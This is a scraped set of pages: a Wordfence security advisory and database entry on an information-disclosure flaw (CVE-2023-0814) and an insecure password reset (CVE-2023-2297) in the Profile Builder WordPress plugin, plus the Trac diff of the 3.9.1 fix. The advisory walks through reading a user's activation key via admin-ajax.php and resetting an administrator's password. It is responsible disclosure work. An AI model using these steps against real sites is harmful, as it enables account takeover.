=== Content from www.wordfence.com_f774c2aa_20250115_100856.html ===


![Leading Image - Vulnerability Patched in Cozmolabs Profile Builder Plugin - Information Disclosure Leads to Account Takevoer](https://www.wordfence.com/wp-content/uploads/2023/03/cozmolabs-profile-builder-leading-updated.png)

[![](https://secure.gravatar.com/avatar/01c3929fe6b851d3cf7bda3c0215f691?s=80&d=mm&r=g)Alex Thomas](https://www.wordfence.com/blog/author/wfalext/)

March 14, 2023

# Vulnerability Patched in Cozmolabs Profile Builder Plugin – Information Disclosure Leads to Account Takeover

Hundreds, if not thousands of WordPress plugins are conceived with the idea of making site building and maintenance easier for site owners. They add features not available in WordPress Core that would otherwise require site owners to write their own code to extend functionality. However, these well-intentioned plugins may sometimes contain seemingly innocuous bugs that can lead to catastrophic consequences.

On Tuesday, February 7th, 2023, prominent WordPress vulnerability researcher István Márton, also known as [Lana Codes](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes), reached out to the Wordfence Threat Intelligence team to responsibly disclose an [information disclosure vulnerability](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/profile-builder/profile-builder-user-profile-user-registration-forms-390-sensitive-information-disclosure-via-shortcode) in [Cozmolabs Profile Builder](https://wordpress.org/plugins/profile-builder/), a WordPress plugin designed to enhance the user profile and registration experience with a reported 60,000+ active installations. If exploited, this vulnerability allows threat actors to gain elevated privileges by taking over arbitrary accounts.

Wordfence researchers quickly assessed the vulnerability and deployed a firewall rule to protect customers from exploitation. [Premium](https://www.wordfence.com/products/wordfence-premium/), [Care](https://www.wordfence.com/products/wordfence-care/), and [Response](https://www.wordfence.com/products/wordfence-response/) customers received that protection on February 13, 2023 as well as an additional firewall rule for extended protection on February 14, 2023. Sites still running the free version of Wordfence will receive the same protection 30 days later on March 14 and March 15, 2023, respectively.

In coordination with Márton, Cozmolabs quickly released a fix in Profile Builder version 3.9.1 on February 13, 2023, only 6 days after the vulnerability’s discovery.

## Vulnerability Summary

**Description:** [Profile Builder – User Profile & User Registration Forms <= 3.9.0 – Sensitive Information Disclosure via Shortcode](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/profile-builder/profile-builder-user-profile-user-registration-forms-390-sensitive-information-disclosure-via-shortcode)

**Affected Plugin:** Profile Builder – User Profile & User Registration Forms

**Plugin Slug:** profile-builder

**Affected Versions:** <= 3.9.0

**CVE ID:** [CVE-2023-0814](https://www.cve.org/CVERecord?id=CVE-2023-0814)

**CVSS Score:** 6.4 (Medium)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Researcher/s:** [Lana Codes](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes)

**Fully Patched Version:** 3.9.1
## Vulnerability Analysis

The vulnerability, assigned [CVE-2023-0814](https://www.cve.org/CVERecord?id=CVE-2023-0814), exists due to missing authorization within the wppb\_toolbox\_usermeta\_handler() function. The affected function is defined as a callback function to the [‘user\_meta’ shortcode](https://www.cozmoslabs.com/docs/profile-builder-2/developers-knowledge-base/shortcodes/display-user-meta/), which is registered via the WordPress add\_shortcode() function in usermeta.php.

As with all shortcode callback functions, wppb\_toolbox\_usermeta\_handler() takes an array of attributes. In particular, the ‘user\_id’ attribute is used to create a new user object. Then, the ‘key’ attribute is used in a call to ‘$user->get()’. Finally, the function returns the value of the retrieved ‘key’ for the given ‘user\_id’. During this process, capability checks are not properly implemented to ensure that the user executing the function is authorized to retrieve the given ‘key’ value.

![Profile Builder wppb_toolbox_usermeta_handler function](https://www.wordfence.com/wp-content/uploads/2023/03/Screenshot-from-2023-03-07-16-13-54.png)

The wppb\_toolbox\_usermeta\_handler() function creates a user object and performs a $user->get() with threat actor-supplied values.

## Prerequisites

Vulnerable instances of Profile Builder need the ‘Enable Usermeta shortcode’ setting enabled within the ‘Shortcodes’ section of the ‘Advanced Settings’ tab of the plugin’s ‘Settings’ page.

![Profile Builder Advanced Settings Page](https://www.wordfence.com/wp-content/uploads/2023/03/profile-builder-screenshot-1.png)

‘Enable Usermeta shortcode’ setting activated

## Exploitation

### Information Disclosure

Any authenticated user, with subscriber-level permissions or greater, can send a specially-crafted HTTP POST request to the ‘wp-admin/admin-ajax.php’ endpoint with the ‘action’ parameter set to ‘parse-media-shortcode’ and the ‘shortcode’ parameter containing the ‘user\_meta’ shortcode with the ‘user\_id’ and ‘key’ attributes set.

![Profile Builder POST to admin-ajax.php to retrieve the username of the user with a user ID of 1](https://www.wordfence.com/wp-content/uploads/2023/03/Screenshot-from-2023-03-07-16-21-06.png)

POST to admin-ajax.php to retrieve the username of the user with a user ID of 1

As explained earlier, the value of the ‘key’ attribute is passed to a $user->get() call. Since the get() method of the WP\_User class is designed to retrieve user information, any column of the ‘wp\_users’ table can be passed via this attribute, including:

* ID
* user\_login
* user\_pass
* user\_nicename
* user\_email
* user\_url
* user\_registered
* user\_activation\_key
* user\_status
* display\_name

### Password Reset to Privilege Escalation

The Profile Builder plugin provides the shortcode [‘[wppb-recover-password]’](https://www.cozmoslabs.com/docs/profile-builder-2/shortcodes/) to embed a password recovery form into a page on a WordPress site. The form allows users to submit their username or email address to receive an email with a password reset link containing a user activation key. When generated, this key is stored in the ‘user\_activation\_key’ column in the ‘wp\_users’ table of the WordPress database. Using CVE-2023-0814, this key can be retrieved for any user.

First, the threat actor must generate the user activation key by entering the username or email address of the targeted user in the password recovery form and clicking the ‘Get New Password’ button.

![Profile Builder password recovery form](https://www.wordfence.com/wp-content/uploads/2023/03/profile-builder-screenshot-2.png)

Profile Builder password recovery form

Next, the threat actor will make a similar POST request to our previous user enumeration proof-of-concept, but this time ensuring the ‘user\_id’ is set to the user ID of the username or email address entered into the password recovery form and setting the ‘key’ attribute to ‘user\_activation\_key’.

![Profile Builder POST to admin-ajax.php to retrieve the user activation key for the admin account](https://www.wordfence.com/wp-content/uploads/2023/03/Screenshot-from-2023-03-07-16-30-15.png)

POST to admin-ajax.php to retrieve the user activation key for the admin account

Once the threat actor has retrieved the user activation key, they can navigate back to the password recovery form page, but this time with the ‘key’ query parameter set to the retrieved user activation key.

![Password Recovery page with ‘key’ query parameter set to retrieved value](https://www.wordfence.com/wp-content/uploads/2023/03/profile-builder-screenshot-3.png)

Password Recovery page with ‘key’ query parameter set to retrieved value

At this point, the threat actor simply needs to enter a new password and click the ‘Reset Password’ button. The threat actor will then be able to login using the targeted username and new password.

## Timeline

**February 7th, 2023** – Lana Codes responsibly discloses the vulnerability to the plugin vendor and our Vulnerability Disclosure program.

**February 13th, 2023** – The vendor releases a patch in version 3.9.1 and Wordfence releases a firewall rule to address the vulnerability. Wordfence Premium, Care, and Response users receive this rule.

**February 14th, 2023** – Wordfence releases an additional firewall rule to provide extended protection against exploitation. Wordfence Premium, Care, and Response users receive this rule.

**March 14th, 2023** – Wordfence free users receive the first firewall rule.

**March 15th, 2023** – Wordfence free users receive the second firewall rule.

## Conclusion

In today’s post, we covered an Information Disclosure vulnerability that could lead to the takeover of an administrative account in Cozmolabs Profile Builder, a plugin used by over 60,000 WordPress installations. The Wordfence Threat Intelligence team issued a firewall rule providing protection against the vulnerability on February 13th and 14th, 2023. This rule has been protecting our [Wordfence Premium](https://www.wordfence.com/products/wordfence-premium/), [Wordfence Care](https://www.wordfence.com/products/wordfence-care/), and [Wordfence Response](https://www.wordfence.com/products/wordfence-response/) users since that date, while those still using our free version will receive this rule on March 14 and March 15, 2023.

If you believe your site has been compromised as a result of this vulnerability or any other vulnerability, we offer Incident Response services via [Wordfence Care](https://www.wordfence.com/products/wordfence-care/). If you need your site cleaned immediately, [Wordfence Response](https://www.wordfence.com/products/wordfence-response/) offers the same service with 24/7/365 availability and a 1-hour response time. Both of these products include hands-on support in case you need further assistance. If you have any friends or colleagues who are using this plugin, please share this announcement with them and encourage them to update to the latest patched version of Profile Builder as soon as possible.

If you are a security researcher, you can [responsibly disclose your finds to us and obtain a CVE ID](https://www.wordfence.com/request-cve/) and get your name on the [Wordfence Intelligence leaderboard](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/).

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2023%2F03%2Fvulnerability-patched-in-cozmolabs-profile-builder-plugin-information-disclosure-leads-to-account-takeover%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2023%2F03%2Fvulnerability-patched-in-cozmolabs-profile-builder-plugin-information-disclosure-leads-to-account-takeover%2F&text=Vulnerability%20Patched%20in%20Cozmolabs%20Profile%20Builder%20Plugin%20%E2%80%93%20Information%20Disclosure%20Leads%20to%20Account%20Takeover&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2023%2F03%2Fvulnerability-patched-in-cozmolabs-profile-builder-plugin-information-disclosure-leads-to-account-takeover%2F)

## Comments

No Comments

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save



=== Content from www.wordfence.com_e6481969_20250115_100857.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Profile Builder – User Profile & User Registration Forms <= 3.9.0 - Insecure Password Reset Mechanism

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Profile Builder – User Profile & User Registration Forms <= 3.9.0 - Insecure Password Reset Mechanism

9.8

**Unverified Password Change**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2023-2297](https://www.cve.org/CVERecord?id=CVE-2023-2297) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | February 13, 2023 |
| Last Updated | January 22, 2024 |
| Researcher | [István Márton - Wordfence](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/lana-codes) |

### Description

The Profile Builder – User Profile & User Registration Forms plugin for WordPress is vulnerable to unauthorized password resets in versions up to, and including 3.9.0. This is due to the plugin using native password reset functionality, with insufficient validation on the password reset function (wppb\_front\_end\_password\_recovery). The function uses the plaintext value of a password reset key instead of a hashed value which means it can easily be retrieved and subsequently used. An attacker can leverage CVE-2023-0814, or another vulnerability like SQL Injection in another plugin or theme installed on the site to successfully exploit this vulnerability.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2864329%40profile-builder&new=2864329%40profile-builder&sfp_email=&sfph_mail=)
* [lana.codes](https://lana.codes/lanavdb/512e7307-04a5-4d8b-8f79-f75f37784a9f/)
* [www.wordfence.com](https://www.wordfence.com/blog/2023/03/vulnerability-patched-in-cozmolabs-profile-builder-plugin-information-disclosure-leads-to-account-takeover/)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fprofile-builder%2Fprofile-builder-user-profile-user-registration-forms-390-insecure-password-reset-mechnism&t=Profile%20Builder%20%E2%80%93%20User%20Profile%20%26%20User%20Registration%20Forms%20%3C%3D%203.9.0%20-%20Insecure%20Password%20Reset%20Mechanism "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fprofile-builder%2Fprofile-builder-user-profile-user-registration-forms-390-insecure-password-reset-mechnism&text=Profile%20Builder%20%E2%80%93%20User%20Profile%20%26%20User%20Registration%20Forms%20%3C%3D%203.9.0%20-%20Insecure%20Password%20Reset%20Mechanism "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fprofile-builder%2Fprofile-builder-user-profile-user-registration-forms-390-insecure-password-reset-mechnism "LinkedIn")
Email

## Vulnerability Details for User Profile Builder – Beautiful User Registration Forms, User Profiles & User Role Editor

#### [User Profile Builder – Beautiful User Registration Forms, User Profiles & User Role Editor](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/profile-builder)

| Software Type | Plugin |
| --- | --- |
| Software Slug | profile-builder [(view on wordpress.org)](https://wordpress.org/plugins/profile-builder) |
| Patched? | Yes |
| Remediation | Update to version 3.9.1, or a newer patched version |
| Affected Version | * <= 3.9.0 |
| Patched Version | * 3.9.1 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_b0bec81f_20250115_100855.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew%3D2864329%2540profile-builder%26old%3D2864329%2540profile-builder)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/2862446/profile-builder "Changeset 2862446 for profile-builder")
* [Next Change](/changeset/2868642/profile-builder "Changeset 2868642 for profile-builder") →

---

# Changeset [2864329](/changeset/2864329 "Show full changeset") for [profile-builder](/browser/profile-builder?rev=2864329 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
02/13/2023 11:35:44 AM
([2 years](/timeline?from=2023-02-13T11%3A35%3A44Z&precision=second "See timeline at 02/13/2023 11:35:44 AM") ago)

Author:
raster02
Message:

tagging version 3.9.1

Location:
[profile-builder](/browser/profile-builder?rev=2864329)
Files:

14 edited
1 copied

* [tags/3.9.1](/browser/profile-builder/tags/3.9.1?rev=2864329 "Show entry in browser")
  (copied)
  *(copied from [profile-builder/trunk](/browser/profile-builder/trunk?rev=2862446 "Show original file (revision 2864328)"))*
* [tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php](/browser/profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329 "Show entry in browser")
  (modified)
  ([3 diffs](#file1 "Show differences"))
* [tags/3.9.1/features/email-customizer/email-customizer.php](/browser/profile-builder/tags/3.9.1/features/email-customizer/email-customizer.php?rev=2864329 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [tags/3.9.1/front-end/recover.php](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329 "Show entry in browser")
  (modified)
  ([6 diffs](#file3 "Show differences"))
* [tags/3.9.1/index.php](/browser/profile-builder/tags/3.9.1/index.php?rev=2864329 "Show entry in browser")
  (modified)
  ([3 diffs](#file4 "Show differences"))
* [tags/3.9.1/readme.txt](/browser/profile-builder/tags/3.9.1/readme.txt?rev=2864329 "Show entry in browser")
  (modified)
  ([2 diffs](#file5 "Show differences"))
* [tags/3.9.1/translation/profile-builder.catalog.php](/browser/profile-builder/tags/3.9.1/translation/profile-builder.catalog.php?rev=2864329 "Show entry in browser")
  (modified)
  ([1 diff](#file6 "Show differences"))
* [tags/3.9.1/translation/profile-builder.pot](/browser/profile-builder/tags/3.9.1/translation/profile-builder.pot?rev=2864329 "Show entry in browser")
  (modified)
  ([8 diffs](#file7 "Show differences"))
* [trunk/admin/advanced-settings/includes/shortcodes/usermeta.php](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329 "Show entry in browser")
  (modified)
  ([3 diffs](#file8 "Show differences"))
* [trunk/features/email-customizer/email-customizer.php](/browser/profile-builder/trunk/features/email-customizer/email-customizer.php?rev=2864329 "Show entry in browser")
  (modified)
  ([1 diff](#file9 "Show differences"))
* [trunk/front-end/recover.php](/browser/profile-builder/trunk/front-end/recover.php?rev=2864329 "Show entry in browser")
  (modified)
  ([6 diffs](#file10 "Show differences"))
* [trunk/index.php](/browser/profile-builder/trunk/index.php?rev=2864329 "Show entry in browser")
  (modified)
  ([3 diffs](#file11 "Show differences"))
* [trunk/readme.txt](/browser/profile-builder/trunk/readme.txt?rev=2864329 "Show entry in browser")
  (modified)
  ([2 diffs](#file12 "Show differences"))
* [trunk/translation/profile-builder.catalog.php](/browser/profile-builder/trunk/translation/profile-builder.catalog.php?rev=2864329 "Show entry in browser")
  (modified)
  ([1 diff](#file13 "Show differences"))
* [trunk/translation/profile-builder.pot](/browser/profile-builder/trunk/translation/profile-builder.pot?rev=2864329 "Show entry in browser")
  (modified)
  ([8 diffs](#file14 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php](/changeset/2864329/profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php")

  | [r2555038](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L21 "Show revision 2555038 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L21 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 21 | 21 | } |
  | 22 | 22 |  |
  |  | 23 | if( in\_array( $atts['key'], array( 'user\_pass', 'user\_activation\_key' ) ) ) |
  |  | 24 | return; |
  | 23 | 25 |  |
  | 24 |  | $user = new WP\_User(~~$atts['user\_id']~~); |
  |  | 26 | $user = new WP\_User( $atts['user\_id'] ); |
  | 25 | 27 |  |
  | 26 | 28 | if ( !$user->exists() ) return; |
  | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L37) | […](/browser/profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L39) |  |
  | 37 | 39 |  |
  | 38 | 40 | if ( $user->has\_prop( $atts['key'] ) ){ |
  |  | 41 |  |
  | 39 | 42 | if ($atts['wpautop'] == 'on'){ |
  | 40 | 43 | $value = wpautop( $user->get( $atts['key'] ) ); |
  | […](/browser/profile-builder/trunk/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2555038#L42) | […](/browser/profile-builder/tags/3.9.1/admin/advanced-settings/includes/shortcodes/usermeta.php?rev=2864329#L45) |  |
  | 42 | 45 | $value = $user->get( $atts['key'] ); |
  | 43 | 46 | } |
  |  | 47 |  |
  | 44 | 48 | } |
  | 45 | 49 |  |
* ## [profile-builder/tags/3.9.1/features/email-customizer/email-customizer.php](/changeset/2864329/profile-builder/tags/3.9.1/features/email-customizer/email-customizer.php "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/features/email-customizer/email-customizer.php")

  | [r2862446](/browser/profile-builder/trunk/features/email-customizer/email-customizer.php?rev=2862446#L169 "Show revision 2862446 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/features/email-customizer/email-customizer.php?rev=2864329#L169 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 169 | 169 | function wppb\_email\_customizer\_password\_reset\_content\_filter\_handler( $default\_string, $user\_id, $user\_login, $user\_email ) { |
  | 170 | 170 | $email\_customizer\_option = get\_option( 'wppb\_user\_emailc\_reset\_email\_content', 'not\_found' ); |
  | 171 |  | $key = wppb\_retrieve\_activation\_key( $user\_login ); |
  | 172 |  | $url = add\_query\_arg( array( 'key' => $key ), wppb\_curpageurl() ); |
  |  | 171 | $user = new WP\_User( $user\_id ); |
  |  | 172 | $key = get\_password\_reset\_key( $user ); |
  |  | 173 | $url = add\_query\_arg( array( 'key' => $key, 'login' => $user->user\_login ), wppb\_curpageurl() ); |
  | 173 | 174 |  |
  | 174 | 175 | if( $email\_customizer\_option != 'not\_found' ) { |
* ## [profile-builder/tags/3.9.1/front-end/recover.php](/changeset/2864329/profile-builder/tags/3.9.1/front-end/recover.php "Show the changeset 2864329 restricted to profile-builder/tags/3.9.1/front-end/recover.php")

  | [r2801035](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L24 "Show revision 2801035 of this file in browser") | [r2864329](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L24 "Show revision 2864329 of this file in browser") |  |
  | --- | --- | --- |
  | 24 | 24 | } |
  | 25 | 25 |  |
  | 26 |  | ~~/\*\*~~ |
  | 27 |  | ~~\* Function that retrieves the unique user key from the database. If we don't have one we generate one and add it to the database~~ |
  | 28 |  | ~~\*~~ |
  | 29 |  | ~~\* @param string $requested\_user\_login the user login~~ |
  | 30 |  | ~~\*~~ |
  | 31 |  | ~~\*/~~ |
  | 32 |  | ~~function wppb\_retrieve\_activation\_key( $requested\_user\_login ){~~ |
  | 33 |  | ~~global $wpdb;~~ |
  | 34 |  |  |
  | 35 |  | ~~$key = $wpdb->get\_var( $wpdb->prepare( "SELECT user\_activation\_key FROM $wpdb->users WHERE user\_login = %s", $requested\_user\_login ) );~~ |
  | 36 |  |  |
  | 37 |  | ~~if ( empty( $key ) ) {~~ |
  | 38 |  |  |
  | 39 |  | ~~// Generate something random for a key...~~ |
  | 40 |  | ~~$key = wp\_generate\_password( 20, false );~~ |
  | 41 |  | ~~do\_action('wppb\_retrieve\_password\_key', $requested\_user\_login, $key);~~ |
  | 42 |  |  |
  | 43 |  | ~~// Now insert the new md5 key into the db~~ |
  | 44 |  | ~~$wpdb->update($wpdb->users, array('user\_activation\_key' => $key), array('user\_login' => $requested\_user\_login));~~ |
  | 45 |  | ~~}~~ |
  | 46 |  |  |
  | 47 |  | ~~return $key;~~ |
  | 48 |  | ~~}~~ |
  | 49 | 26 |  |
  | 50 | 27 | /\*\* |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L95) | […](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L72) |  |
  | 95 | 72 | <input name="action2" type="hidden" id="action2" value="recover\_password2" /> |
  | 96 | 73 | <input name="key" type="hidden" id="key" value="<?php echo esc\_attr( isset( $\_GET['key'] ) ? sanitize\_text\_field( $\_GET['key'] ) : '' ) ?>" /> |
  |  | 74 | <input name="login" type="hidden" id="login" value="<?php echo esc\_attr( isset( $\_GET['login'] ) ? sanitize\_text\_field( $\_GET['login'] ) : '' ) ?>" /> |
  | 97 | 75 | </p><!-- .form-submit --> |
  | 98 | 76 | <?php wp\_nonce\_field( 'verify\_true\_password\_recovery2\_'.$user->ID, 'password\_recovery\_nonce\_field2' ); ?> |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L172) | […](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L150) |  |
  | 172 | 150 | return false; |
  | 173 | 151 |  |
  | 174 |  | $requested\_user\_id = $user->ID; |
  | 175 |  | $requested\_user\_login = $user->user\_login; |
  | 176 |  | $requested\_user\_email = $user->user\_email; |
  |  | 152 | $user\_object = new WP\_User( $user->ID ); |
  |  | 153 |  |
  |  | 154 | if( empty( $user\_object->ID ) ) |
  |  | 155 | return false; |
  |  | 156 |  |
  |  | 157 | $requested\_user\_id    = $user\_object->ID; |
  |  | 158 | $requested\_user\_login = $user\_object->user\_login; |
  |  | 159 | $requested\_user\_email = $user\_object->user\_email; |
  | 177 | 160 |  |
  | 178 | 161 | //search if there is already an activation key present, if not create one |
  | 179 |  | $key = ~~wppb\_retrieve\_activation\_key( $requested\_user\_login~~ ); |
  |  | 162 | $key = get\_password\_reset\_key( $user\_object ); |
  | 180 | 163 |  |
  | 181 | 164 | $display\_username\_email = wppb\_get\_email\_display\_username($user); |
  | 182 | 165 |  |
  | 183 | 166 | //send primary email message |
  | 184 |  | $recovery\_email\_message  = sprintf( \_\_('Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s', 'profile-builder'), $display\_username\_email, '<a href="'.esc\_url( add\_query\_arg( array( 'key' => $key~~), wppb\_curpageurl() ) ).'">'.esc\_url( add\_query\_arg( array( 'key' => $key~~ ), wppb\_curpageurl() ) ).'</a>' ); |
  |  | 167 | $recovery\_email\_message  = sprintf( \_\_('Someone requested that the password be reset for the following account: <b>%1$s</b><br/>If this was a mistake, just ignore this email and nothing will happen.<br/>To reset your password, visit the following link:%2$s', 'profile-builder'), $display\_username\_email, '<a href="'.esc\_url( add\_query\_arg( array( 'key' => $key, 'login' => $requested\_user\_login ), wppb\_curpageurl() ) ).'">'.esc\_url( add\_query\_arg( array( 'key' => $key, 'login' => $requested\_user\_login ), wppb\_curpageurl() ) ).'</a>' ); |
  | 185 | 168 | $recovery\_email\_message  = apply\_filters( 'wppb\_recover\_password\_message\_content\_sent\_to\_user1', $recovery\_email\_message, $requested\_user\_id, $requested\_user\_login, $requested\_user\_email ); |
  | 186 | 169 |  |
  | […](/browser/profile-builder/trunk/front-end/recover.php?rev=2801035#L367) | […](/browser/profile-builder/tags/3.9.1/front-end/recover.php?rev=2864329#L350) |  |
  | 367 | 350 | } |
  | 368 | 351 |  |
  | 369 |  | $user\_object = $wpdb->get\_row( $wpdb->prepare( "SELECT \* FROM $wpdb->users WHERE user\_activation\_key = %s", $key ) ); |
